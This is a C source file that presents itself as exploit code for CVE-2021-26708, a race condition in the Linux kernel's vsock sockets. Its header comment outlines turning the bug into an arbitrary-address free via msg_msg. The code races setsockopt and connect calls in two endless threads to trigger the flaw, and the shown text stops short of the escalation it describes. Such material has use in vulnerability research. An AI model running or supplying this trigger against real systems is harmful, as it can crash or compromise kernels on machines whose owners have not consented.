/******************************************************************
 *
 * Exp code of CVE-2021-26708
 * By fr33bug @freebug
 *
 * Exploit steps:
 * This bug is a race condition vulnierability which results in write 4 tyes at offset 40 of a 64-byte kernel object. (use-after-free)
 * we can turn this vuln into arbitrary address free by overwite the security member in the struct msg_msg (abitrary-address-free)
 
 * ***************************************************************/

#include <stdio.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>
#include <linux/vm_sockets.h>

void *thread_setsockopt (void *arg)
{
	int vsk;
	struct timespec t;
	unsigned long size = 0;

	vsk = *((int *)arg);
	printf("In function %s, socket is %d\n", __FUNCTION__, vsk);

	while (1)
	{
		clock_gettime (CLOCK_MONOTONIC, &t);
		size = t.tv_nsec;
		setsockopt (vsk, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE, &size, sizeof (unsigned long));
	};
}

void *thread_reconnect (void *arg)
{
	int vsk;
	struct sockaddr_vm addr;

	vsk = *((int *)arg);
	printf("In function %s, socket is %d\n", __FUNCTION__, vsk);

	addr.svm_family = AF_VSOCK;

	while (1)
	{
		addr.svm_cid = VMADDR_CID_LOCAL;
		connect (vsk, (struct sockaddr *)&addr, sizeof (struct sockaddr_vm));

		addr.svm_cid = VMADDR_CID_HYPERVISOR;
		connect (vsk, (struct sockaddr *)&addr, sizeof (struct sockaddr_vm));
	}
}

int main ()
{
	int vsk, ret;
	pthread_t thread[2] = {0};

	unsigned long size = 0;

	struct sockaddr_vm addr;


	vsk = socket (AF_VSOCK, SOCK_STREAM, 0);

	//First thread do setsockopt()
	ret = pthread_create (&thread[0], NULL, thread_setsockopt, &vsk);
	if (ret != 0)
	{
		printf ("Failed to create thread 0\n");
	}

	//Second thread do reconnect
	ret = pthread_create (&thread[1], NULL, thread_reconnect, &vsk);
	if (ret != 0)
	{
		printf ("Failed to create thread 1\n");
	}

	pthread_join (thread[0], NULL);
	pthread_join (thread[1], NULL);

	return 0;
}
